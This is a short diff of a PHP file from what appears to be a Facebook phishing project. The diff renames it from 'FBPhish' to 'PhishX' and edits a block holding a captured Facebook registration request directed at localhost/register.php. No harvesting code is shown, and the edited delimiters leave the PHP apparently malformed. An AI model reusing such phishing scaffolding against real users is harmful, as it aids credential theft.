@@ -1,7 +1,7 @@
 <?php 
 /*
-FBPhish
-Copyright (C) 2016  Jamie4224
+PhishX
+Copyright (c) 2016 Jamie4224
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -20,7 +20,7 @@ along with this program.  If not, see http://www.gnu.org/licenses/.
 
 
 
-<{data
+<{(data,
 
 
 http://localhost/register.php?
@@ -67,3 +67,5 @@ ab_test_data=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&
 
 next=https%3A%2F%2Fnl-nl.facebook.com%2F&
 qsstamp=W1tbMTgsMzgsNDgsNTEsNTUsNjksNzYsMTE0LDExNiwxMjQsMTgxLDIxMSwyMjksMjM1LDI2MCwyOTgsMzA5LDMxMSwzMTgsMzYyLDM2NiwzODMsMzg4LDQwMSw0MDgsNDE5LDQyNSw0MzUsNDYzLDQ2NSw0ODEsNDk1LDUwMiw1MjIsNTQ0LDU1Myw1NTcsNTYwLDU2NSw2MjYsNjkzLDY5OF1dLCJBWmwySFdISjBzSFZHUS1leXZrM2RENFRWbTI5elVUUHppWWxVS0ItQ09LYnNwT1d1M3FJNWwzYlpYamtEb2pBX2tvU1FubWNCMjJ3MlNsSWZaWDVMakFudUloMGFXcHM1OGxla3FJMGhIYktycHNpQ29VRmVMQWlqNk9DRlByYXJ4VU1GMEFkWHpSX192bVdsM2VpTFNOS3JlQkMtbjdLZmZtMlpHUFIzLXJtb1JGWWpaUy1rWDVZX2ZwZHZudW1MbnVFbU9tVTFPQWtlbGZocU5EdjN1WURJRkF1Si13N3MxTGNiekNXT01DNlh3Il0%3D
+
+)}>
